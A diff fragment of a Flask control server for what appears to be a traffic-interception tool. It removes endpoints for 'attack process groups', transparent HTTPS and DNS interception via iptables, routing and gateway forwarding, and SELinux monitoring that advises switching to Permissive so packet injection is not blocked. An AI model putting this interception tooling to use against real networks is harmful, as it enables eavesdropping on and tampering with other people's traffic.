-@app.route('/api/capabilities/status', methods=['GET'])
-@require_auth
-def api_capabilities_status():
-    return jsonify({
-        'success': True,
-        'capabilities': get_capability_status()
-    })
-
-@app.route('/api/capabilities/restore', methods=['POST'])
-@require_auth
-def api_capabilities_restore():
-    restored = attempt_capability_restoration()
-    caps = get_capability_status()
-    return jsonify({
-        'success': restored,
-        'message': 'Attempted to restore CAP_NET_RAW capability',
-        'capabilities': caps
-    })
-
-@app.route('/api/process_groups/status', methods=['GET'])
-@require_auth
-def api_process_groups_status():
-    """Get status of all attack process groups."""
-    status = {}
-    for group_name, group in attack_process_groups.items():
-        status[group_name] = group.get_status()
-    return jsonify({'success': True, 'process_groups': status})
-
-@app.route('/api/process_groups/<group_name>/terminate', methods=['POST'])
-@require_auth
-def api_process_groups_terminate(group_name):
-    """Terminate all processes in a group (non-blocking)."""
-    if group_name not in attack_process_groups:
-        return jsonify({'success': False, 'error': f'Unknown process group: {group_name}'}), 400
-
-    group = attack_process_groups[group_name]
-    group.terminate_all()
-    return jsonify({'success': True, 'message': f'Termination initiated for {group_name}'})
-
-@app.route('/api/transparent/status', methods=['GET'])
-@require_auth
-def api_transparent_status():
-    """Get transparent interceptor status and active chains."""
-    return jsonify({'success': True, 'transparent': TRANSPARENT_INTERCEPTOR.get_status()})
-
-@app.route('/api/transparent/https/enable', methods=['POST'])
-@require_auth
-def api_transparent_https_enable():
-    """Enable transparent HTTPS interception."""
-    data = request.json or {}
-    target_ips = data.get('target_ips')  # None = all traffic
-    # Use actual port from HTTPS proxy (may not be 8888 if port conflict occurred)
-    default_port = HTTPS_PROXY.listen_port if HTTPS_PROXY else 8888
-    proxy_port = data.get('proxy_port', default_port)
-
-    if not TRANSPARENT_INTERCEPTOR.is_available():
-        return jsonify({'success': False, 'error': 'iptables not available'}), 500
-
-    chain = TRANSPARENT_INTERCEPTOR.enable_https_intercept(target_ips, proxy_port)
-    if chain:
-        return jsonify({'success': True, 'chain': chain, 'message': 'HTTPS interception enabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to enable HTTPS interception'}), 500
-
-@app.route('/api/transparent/https/disable', methods=['POST'])
-@require_auth
-def api_transparent_https_disable():
-    """Disable transparent HTTPS interception."""
-    chain_name = f'{TRANSPARENT_INTERCEPTOR.chain_prefix}HTTPS'
-    if TRANSPARENT_INTERCEPTOR.disable_chain(chain_name):
-        return jsonify({'success': True, 'message': 'HTTPS interception disabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to disable HTTPS interception'}), 500
-
-@app.route('/api/transparent/dns/enable', methods=['POST'])
-@require_auth
-def api_transparent_dns_enable():
-    """Enable transparent DNS redirection."""
-    data = request.json or {}
-    dns_port = data.get('dns_port', 5353)
-
-    if not TRANSPARENT_INTERCEPTOR.is_available():
-        return jsonify({'success': False, 'error': 'iptables not available'}), 500
-
-    chain = TRANSPARENT_INTERCEPTOR.enable_dns_intercept(dns_port)
-    if chain:
-        return jsonify({'success': True, 'chain': chain, 'message': 'DNS interception enabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to enable DNS interception'}), 500
-
-@app.route('/api/transparent/dns/disable', methods=['POST'])
-@require_auth
-def api_transparent_dns_disable():
-    """Disable transparent DNS redirection."""
-    chain_name = f'{TRANSPARENT_INTERCEPTOR.chain_prefix}DNS'
-    if TRANSPARENT_INTERCEPTOR.disable_chain(chain_name):
-        return jsonify({'success': True, 'message': 'DNS interception disabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to disable DNS interception'}), 500
-
-@app.route('/api/transparent/cleanup', methods=['POST'])
-@require_auth
-def api_transparent_cleanup():
-    """Clean up all transparent interceptor rules."""
-    if TRANSPARENT_INTERCEPTOR.cleanup_all():
-        return jsonify({'success': True, 'message': 'All interceptor rules cleaned up'})
-    else:
-        return jsonify({'success': False, 'error': 'Cleanup partially failed'}), 500
-
-# ---------- Phase 9: Port Forwarding API Endpoints ----------
-@app.route('/api/portforward/status', methods=['GET'])
-@require_auth
-def api_portforward_status():
-    """Get port forwarding status and active rules."""
-    return jsonify({'success': True, 'portforward': PORT_FORWARDING_MANAGER.get_status()})
-
-@app.route('/api/portforward/rule/add', methods=['POST'])
-@require_auth
-def api_portforward_add_rule():
-    """Add a routing rule to forward traffic to a specific table."""
-    data = request.json or {}
-    from_ip = data.get('from_ip')
-    to_ip = data.get('to_ip')
-    iface = data.get('iface')
-    table_id = data.get('table_id')
-    priority = data.get('priority')
-
-    if not PORT_FORWARDING_MANAGER.is_available():
-        return jsonify({'success': False, 'error': 'Port forwarding not available'}), 500
-
-    rule_id = PORT_FORWARDING_MANAGER.add_rule(
-        from_ip=from_ip, to_ip=to_ip, iface=iface, table_id=table_id, priority=priority
-    )
-
-    if rule_id is not None:
-        return jsonify({'success': True, 'rule_id': rule_id, 'message': 'Routing rule added'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to add routing rule'}), 500
-
-@app.route('/api/portforward/route/add', methods=['POST'])
-@require_auth
-def api_portforward_add_route():
-    """Add a route to a routing table."""
-    data = request.json or {}
-    dest_ip = data.get('dest_ip')
-    via_ip = data.get('via_ip')
-    table_id = data.get('table_id')
-    iface = data.get('iface')
-    metric = data.get('metric', 100)
-
-    if not PORT_FORWARDING_MANAGER.is_available():
-        return jsonify({'success': False, 'error': 'Port forwarding not available'}), 500
-
-    route_idx = PORT_FORWARDING_MANAGER.add_route(
-        dest_ip=dest_ip, via_ip=via_ip, table_id=table_id, iface=iface, metric=metric
-    )
-
-    if route_idx is not None:
-        return jsonify({'success': True, 'route_index': route_idx, 'message': 'Route added'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to add route'}), 500
-
-@app.route('/api/portforward/redirect/enable', methods=['POST'])
-@require_auth
-def api_portforward_redirect_enable():
-    """Enable port redirection using routing tables."""
-    data = request.json or {}
-    local_port = data.get('local_port')
-    dest_port = data.get('dest_port')
-    dest_ip = data.get('dest_ip')
-    protocol = data.get('protocol', 'tcp')
-    source_ip = data.get('source_ip')
-
-    if not PORT_FORWARDING_MANAGER.is_available():
-        return jsonify({'success': False, 'error': 'Port forwarding not available'}), 500
-
-    table_id = PORT_FORWARDING_MANAGER.enable_port_redirect(
-        local_port=local_port, dest_port=dest_port, dest_ip=dest_ip,
-        protocol=protocol, source_ip=source_ip
-    )
-
-    if table_id is not None:
-        return jsonify({'success': True, 'table_id': table_id, 'message': 'Port redirect enabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to enable port redirect'}), 500
-
-@app.route('/api/portforward/gateway/enable', methods=['POST'])
-@require_auth
-def api_portforward_gateway_enable():
-    """Enable gateway forwarding using routing tables."""
-    data = request.json or {}
-    gateway_ip = data.get('gateway_ip')
-    target_network = data.get('target_network')
-    iface = data.get('iface')
-
-    if not PORT_FORWARDING_MANAGER.is_available():
-        return jsonify({'success': False, 'error': 'Port forwarding not available'}), 500
-
-    table_id = PORT_FORWARDING_MANAGER.enable_gateway_forwarding(
-        gateway_ip=gateway_ip, target_network=target_network, iface=iface
-    )
-
-    if table_id is not None:
-        return jsonify({'success': True, 'table_id': table_id, 'message': 'Gateway forwarding enabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to enable gateway forwarding'}), 500
-
-@app.route('/api/portforward/table/disable', methods=['POST'])
-@require_auth
-def api_portforward_table_disable():
-    """Disable and remove a routing table."""
-    data = request.json or {}
-    table_id = data.get('table_id')
-
-    if table_id is None:
-        return jsonify({'success': False, 'error': 'table_id required'}), 400
-
-    if PORT_FORWARDING_MANAGER.disable_table(table_id):
-        return jsonify({'success': True, 'message': f'Table {table_id} disabled'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to disable table'}), 500
-
-@app.route('/api/portforward/cleanup', methods=['POST'])
-@require_auth
-def api_portforward_cleanup():
-    """Clean up all port forwarding rules and tables."""
-    if PORT_FORWARDING_MANAGER.cleanup_all():
-        return jsonify({'success': True, 'message': 'All port forwarding rules cleaned up'})
-    else:
-        return jsonify({'success': False, 'error': 'Cleanup partially failed'}), 500
-
-# ---------- Phase 10: Android Runtime API Endpoints ----------
-@app.route('/api/android/status', methods=['GET'])
-@require_auth
-def api_android_status():
-    """Get Android runtime status and constraints."""
-    return jsonify({'success': True, 'android': ANDROID_RUNTIME.get_status()})
-
-@app.route('/api/android/selinux', methods=['GET'])
-@require_auth
-def api_android_selinux():
-    """Get detailed SELinux constraints and issues."""
-    constraints = ANDROID_RUNTIME.check_selinux_constraints()
-    return jsonify({'success': True, 'selinux': constraints})
-
-@app.route('/api/android/processes', methods=['GET'])
-@require_auth
-def api_android_processes():
-    """List all registered ProcessGroups and their status."""
-    with ANDROID_RUNTIME.lock:
-        groups = {}
-        for name, group in ANDROID_RUNTIME.process_groups.items():
-            status = 'unknown'
-            if hasattr(group, 'get_status'):
-                status = group.get_status()
-            groups[name] = {
-                'name': name,
-                'status': status,
-                'has_terminate': hasattr(group, 'terminate_all')
-            }
-
-    return jsonify({'success': True, 'process_groups': groups, 'count': len(groups)})
-
-@app.route('/api/android/cleanup', methods=['POST'])
-@require_auth
-def api_android_cleanup():
-    """Clean up all ProcessGroups and terminate subprocesses."""
-    if ANDROID_RUNTIME.cleanup_all_processes():
-        return jsonify({'success': True, 'message': 'All ProcessGroups cleaned up'})
-    else:
-        return jsonify({'success': False, 'error': 'Cleanup partially failed'}), 500
-
-@app.route('/api/android/subprocess_env', methods=['GET'])
-@require_auth
-def api_android_subprocess_env():
-    """Get subprocess environment configuration for Android."""
-    env = ANDROID_RUNTIME.setup_subprocess_environment()
-    # Only return safe environment variables (not secrets/paths)
-    safe_vars = ['PATH', 'HOME', 'PREFIX', 'TERMUX_VERSION', 'LANG']
-    safe_env = {k: v for k, v in env.items() if k in safe_vars}
-    return jsonify({'success': True, 'environment': safe_env, 'is_termux': ANDROID_RUNTIME.is_termux})
-
 @app.route('/api/https_injection/rules', methods=['GET'])
 @require_auth
 def api_injection_list_rules():
@@ -10408,8 +7739,6 @@ def api_injection_create_rule():
 
     with STATE_LOCK:
         STATE['injection_rules'].append(rule)
-        if len(STATE['injection_rules']) > 500:
-            STATE['injection_rules'] = STATE['injection_rules'][-500:]
 
     add_log('info', f'Created injection rule: {rule_id} ({rule["action_type"]})')
     return jsonify({'success': True, 'rule': rule})
@@ -10483,54 +7812,6 @@ def api_gateway_proxy_start():
 def api_gateway_proxy_stop():
     stop_gateway_proxy()
     return jsonify({'success': True, 'status': 'Proxy stopped'})
-
-@app.route('/api/gateway/start_all', methods=['POST'])
-@require_auth
-def api_gateway_start_all():
-    """Start all gateway services (DNS + Proxy) with unified configuration."""
-    try:
-        add_log('info', 'Starting unified gateway services (DNS + Proxy)...')
-        start_gateway_dns()
-        time.sleep(0.5)
-        start_gateway_proxy()
-        time.sleep(0.5)
-
-        local_ip = get_local_ip()
-        dns_status = gateway_dns_status()
-        proxy_status = gateway_proxy_status()
-
-        status_msg = f"Gateway services started. "
-        status_msg += f"Access proxy at {local_ip}:{GW_PROXY_PORT}, "
-        status_msg += f"DNS at {local_ip}:{dns_status.get('port', 53)}"
-
-        add_log('success', status_msg)
-        return jsonify({
-            'success': True,
-            'message': status_msg,
-            'gateway_ip': local_ip,
-            'proxy_port': GW_PROXY_PORT,
-            'dns_port': dns_status.get('port', 53),
-            'dns': dns_status,
-            'proxy': proxy_status
-        })
-    except Exception as e:
-        add_log('error', f'Gateway start failed: {e}')
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-@app.route('/api/gateway/stop_all', methods=['POST'])
-@require_auth
-def api_gateway_stop_all():
-    """Stop all gateway services (DNS + Proxy)."""
-    try:
-        add_log('info', 'Stopping gateway services...')
-        stop_gateway_proxy()
-        time.sleep(0.3)
-        stop_gateway_dns()
-        add_log('success', 'All gateway services stopped')
-        return jsonify({'success': True, 'message': 'All gateway services stopped'})
-    except Exception as e:
-        add_log('error', f'Gateway stop failed: {e}')
-        return jsonify({'success': False, 'error': str(e)}), 500
 
 def ddns_config_masked():
     with STATE_LOCK:
@@ -11599,70 +8880,12 @@ def mitigate_ipv6_doh(iface):
     if not (ipv6_success or doh_success):
         add_log('warn', f'IPv6/DoH mitigation partially failed; traffic coverage may be reduced on {iface}')
 
-# ---------- SELinux detection & monitoring ----------
-def check_selinux_status():
-    """Detect SELinux enforcement status (Enforcing/Permissive/Disabled)."""
-    try:
-        result = subprocess.run(['getenforce'], capture_output=True, text=True, timeout=2)
-        return result.stdout.strip()  # Returns: Enforcing|Permissive|Disabled
-    except (subprocess.TimeoutExpired, FileNotFoundError):
-        return None
-
-def _monitor_selinux_denials():
-    """Monitor audit.log for AVC denials in daemon thread."""
-    audit_log = '/data/misc/audit/audit.log' if os.path.exists('/data/misc/audit/audit.log') else '/var/log/audit/audit.log'
-    if not os.path.exists(audit_log):
-        return
-
-    last_size = 0
-    denial_count = 0
-
-    try:
-        while True:
-            try:
-                stat = os.stat(audit_log)
-                if stat.st_size > last_size:
-                    with open(audit_log, 'r') as f:
-                        f.seek(last_size)
-                        for line in f:
-                            if 'avc: denied' in line:
-                                denial_count += 1
-                                if 'af_packet' in line or 'raw_socket' in line:
-                                    add_log('warn', f'SELinux denied raw socket operation: {line[:100]}...')
-                                if denial_count == 1:
-                                    add_log('warn', 'SELinux AVC denials detected - may block packet injection')
-                    last_size = stat.st_size
-                time.sleep(5)
-            except (IOError, OSError):
-                time.sleep(5)
-                continue
-    except Exception as e:
-        add_log('error', f'SELinux denial monitor error: {e}')
-
-def start_selinux_monitoring():
-    """Start background thread to monitor SELinux denials."""
-    selinux_status = check_selinux_status()
-    if not selinux_status:
-        add_log('dev', 'SELinux not detected on system')
-        return
-
-    add_log('info', f'SELinux status: {selinux_status}')
-    if selinux_status == 'Enforcing':
-        add_log('warn', 'SELinux is ENFORCING - may block network operations; consider setting to Permissive')
-
-    # Start denial monitor thread (only if Enforcing)
-    if selinux_status == 'Enforcing':
-        monitor_thread = threading.Thread(target=_monitor_selinux_denials, daemon=True)
-        monitor_thread.start()
-
 # ---------- bootstrap ----------
 if __name__ == '__main__':
     if os.geteuid() != 0:
         print("WARNING: Not running as root. Some features (raw sockets, iptables) may fail.")
     ensure_tool('iw')
     ensure_tool('iptables')
-    start_selinux_monitoring()
-    verify_capabilities_on_startup()
     ddns_bootstrap_from_env()
     threading.Thread(target=ddns_supervisor_loop, daemon=True).start()
     app.run(host='0.0.0.0', port=APP_PORT, debug=False, threaded=True)
